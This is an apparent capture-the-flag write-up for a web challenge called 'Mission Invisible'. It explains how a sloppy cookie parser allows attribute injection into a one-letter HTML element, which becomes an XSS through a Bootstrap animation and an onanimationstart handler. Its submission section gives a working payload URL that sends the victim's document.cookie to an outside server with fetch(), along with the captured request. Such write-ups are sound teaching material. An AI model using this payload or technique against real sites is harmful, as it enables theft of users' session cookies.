# Mission Invisible

### Category: Web

When loading the provided site, we're met with a pretty much blank (more on that later) page running the following script:

```
var getUrlParam = function (name) {
	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
	var r = unescape(window.location.search.substr(1)).match(reg);
	if (r != null) return r[2];
	return null;
}

function setCookie(name, value) {
	var Days = 30;
	var exp = new Date();
	exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);
	document.cookie = name + "=" + value + ";expires=" + exp.toGMTString();
}

function getCookie(name) {
	var search = name + "="
	var offset = document.cookie.indexOf(search)
	if (offset != -1) {
		offset += search.length;
		var end = document.cookie.indexOf(";", offset);
		if (end == -1) {
			end = document.cookie.length;
		}
		return unescape(document.cookie.substring(offset, end));
	}
	else return "";
}

function setElement(tag) {
	tag = tag.substring(0, 1);
	var ele = document.createElement(tag)
	var attrs = getCookie("attrs").split("&");
	for (var i = 0; i < attrs.length; i++) {
		var key = attrs[i].split("=")[0];
		var value = attrs[i].split("=")[1];
		ele.setAttribute(key, value);
	}
	document.body.appendChild(ele);
}

var tag = getUrlParam("tag");
setCookie("tag", tag);
setElement(tag);
```

The first part of the challenge is to obtain control of the attributes of the inserted element, made difficult because the script appears to be checking for an `attrs` cookie that we have no ability to set, since we only get to set the `tag` cookie.

The `setCookie` function looks sane, and in fact the `document.cookie` API can only set one cookie at a time, so there is no way to set the `attrs` cookie in addition to the `tag` cookie here.

The `getCookie` function, however, has a problem.  In the case of the `attrs` cookie, it will search for the string `attrs=` in the cookie and return everything up to the next semicolon.  However, this check _doesn't_ require that `attrs` be its own cookie -- the string `attrs=` could simply appear in another cookie, and that would be picked up!  Further, since `setElement` truncates the `tag` to the first character, we can insert the `attrs` bit in the `tag` cookie without ruining our HTML!

Putting all of this together, if we GET `/?tag=pattrs=style=color:red`, we see that the following element is inserted:

```
<p style="color:red"></p>
```

Now that we can insert attributes, we need to figure out how to leverage this to get an XSS.  The only well-recognized one-letter HTML tags are `<a>`, `<b>`, `<i>`, `<p>`, `<q>`, `<s>`, and `<u>`, none of which have obvious helpful attributes that we could use to immediately trigger an event handler (for example, if we could make an `input`, we could set `onfocus` and `autofocus` to get immediate execution).

This is the part where the "pretty much blank" part comes in.  The page does actually load in some CSS files:

```
<link href="assets/css/bootstrap.min.css" rel="stylesheet">
<link href="assets/css/starter-template.css" rel="stylesheet">
```

While `starter-template.css` is basically empty, `assets/css/bootstrap.min.css` provides a lot of styles.  This includes a couple of animations that we can apply to elements, including one called `progress-bar-stripes`.  While this might not seem immediately useful, you can listen for the start of a CSS animation in the DOM with the `onanimationstart` listener!  So all we need to do is GET `/?tag=pattrs=style=animation-name:progress-bar-stripes%2526onanimationstart=alert(1)`, and the script inserts this tag for us:

```
<p style="animation-name:progress-bar-stripes" onanimationstart="alert(1)"></p>
```

And indeed, we see the alert!  Now we can dump the bot's cookies by replacing our `alert(1)` with a `fetch` to a server we control.

###### Submission

```
http://52.52.236.217:16401/?tag=pattrs=style=animation-name:progress-bar-stripes%2526onanimationstart=fetch(%22http://ctf.bluepichu.com:9090/%22+document.cookie)
```

###### Received request

```
GET /flag=rwctf%7BfR0m1olotH!n9%7D;%20tag=pattrs=style=animation-name:progress-bar-stripes%26onanimationstart=fetch(%22http://ctf.bluepichu.com:9090/%22+document.cookie) HTTP/1.1
```

###### Decoded flag

```
rwctf{fR0m1olotH!n9}
```